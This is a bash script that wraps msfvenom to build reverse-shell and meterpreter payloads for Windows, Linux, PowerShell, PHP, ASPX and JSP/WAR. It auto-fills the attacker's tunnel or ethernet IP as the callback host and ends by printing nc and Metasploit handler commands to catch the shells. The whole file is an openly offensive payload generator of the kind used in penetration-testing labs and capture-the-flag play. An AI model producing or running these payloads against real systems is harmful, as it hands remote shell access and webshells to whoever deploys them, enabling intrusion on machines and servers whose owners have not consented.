#!/usr/bin/env bash
# msfgen.sh - Quick msfvenom payload generator. Drops binaries into tools/payloads/.
# Usage:
#   ./msfgen.sh                       # generate the standard set (win/lin x64 + ps1)
#   ./msfgen.sh windows 4444          # only windows on port 4444
#   ./msfgen.sh linux 9001
#   ./msfgen.sh ps1 4444              # PowerShell reverse shell payload
#   ./msfgen.sh -i 10.10.14.5 windows 4444
set -u

ROOT="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
OUT="$ROOT/tools/payloads"
mkdir -p "$OUT"

GREEN='\033[0;32m'; YELLOW='\033[1;33m'; CYAN='\033[0;36m'; RED='\033[0;31m'; NC='\033[0m'

if ! command -v msfvenom >/dev/null 2>&1; then
    echo -e "${RED}[x]${NC} msfvenom not found. Install metasploit-framework."
    exit 1
fi

IP=""
while [ $# -gt 0 ]; do
    case "$1" in
        -i) IP="$2"; shift 2 ;;
        *)  break ;;
    esac
done

if [ -z "$IP" ]; then
    IP=$(ip -4 addr show tun0 2>/dev/null | awk '/inet /{print $2}' | cut -d/ -f1 | head -1)
    [ -z "$IP" ] && IP=$(ip -4 addr show eth0 2>/dev/null | awk '/inet /{print $2}' | cut -d/ -f1 | head -1)
fi
if [ -z "$IP" ]; then
    echo -e "${RED}[x]${NC} Could not detect IP. Pass with -i <ip>"
    exit 1
fi

TARGET="${1:-all}"
PORT="${2:-4444}"

gen_win()   { echo -e "${CYAN}[*]${NC} Windows x64 -> $OUT/win-rev-${PORT}.exe"
              msfvenom -p windows/x64/shell_reverse_tcp LHOST="$IP" LPORT="$PORT" -f exe -o "$OUT/win-rev-${PORT}.exe" 2>/dev/null
              echo -e "${CYAN}[*]${NC} Windows x64 meterpreter -> $OUT/win-met-${PORT}.exe"
              msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST="$IP" LPORT="$PORT" -f exe -o "$OUT/win-met-${PORT}.exe" 2>/dev/null ;}
gen_lin()   { echo -e "${CYAN}[*]${NC} Linux x64 -> $OUT/lin-rev-${PORT}.elf"
              msfvenom -p linux/x64/shell_reverse_tcp LHOST="$IP" LPORT="$PORT" -f elf -o "$OUT/lin-rev-${PORT}.elf" 2>/dev/null
              chmod +x "$OUT/lin-rev-${PORT}.elf" ;}
gen_ps1()   { echo -e "${CYAN}[*]${NC} PowerShell -> $OUT/rev-${PORT}.ps1"
              msfvenom -p windows/x64/shell_reverse_tcp LHOST="$IP" LPORT="$PORT" -f psh -o "$OUT/rev-${PORT}.ps1" 2>/dev/null ;}
gen_php()   { echo -e "${CYAN}[*]${NC} PHP webshell -> $OUT/rev-${PORT}.php"
              msfvenom -p php/reverse_php LHOST="$IP" LPORT="$PORT" -f raw -o "$OUT/rev-${PORT}.php" 2>/dev/null
              sed -i.bak '1i\
<?php' "$OUT/rev-${PORT}.php" 2>/dev/null
              rm -f "$OUT/rev-${PORT}.php.bak" ;}
gen_aspx()  { echo -e "${CYAN}[*]${NC} ASPX -> $OUT/rev-${PORT}.aspx"
              msfvenom -p windows/x64/shell_reverse_tcp LHOST="$IP" LPORT="$PORT" -f aspx -o "$OUT/rev-${PORT}.aspx" 2>/dev/null ;}
gen_war()   { echo -e "${CYAN}[*]${NC} JSP/WAR -> $OUT/rev-${PORT}.war"
              msfvenom -p java/jsp_shell_reverse_tcp LHOST="$IP" LPORT="$PORT" -f war -o "$OUT/rev-${PORT}.war" 2>/dev/null ;}

case "$TARGET" in
    windows|win)  gen_win ;;
    linux|lin)    gen_lin ;;
    ps1|psh)      gen_ps1 ;;
    php)          gen_php ;;
    aspx)         gen_aspx ;;
    war|jsp)      gen_war ;;
    all|*)        gen_win; gen_lin; gen_ps1; gen_php; gen_aspx; gen_war ;;
esac

echo
echo -e "${GREEN}[+]${NC} Payloads in $OUT (IP=$IP, PORT=$PORT)"
echo -e "${YELLOW}Listener:${NC}  rlwrap nc -lvnp $PORT"
echo -e "${YELLOW}Or msf:${NC}    msfconsole -q -x \"use exploit/multi/handler; set PAYLOAD windows/x64/meterpreter/reverse_tcp; set LHOST $IP; set LPORT $PORT; run\""
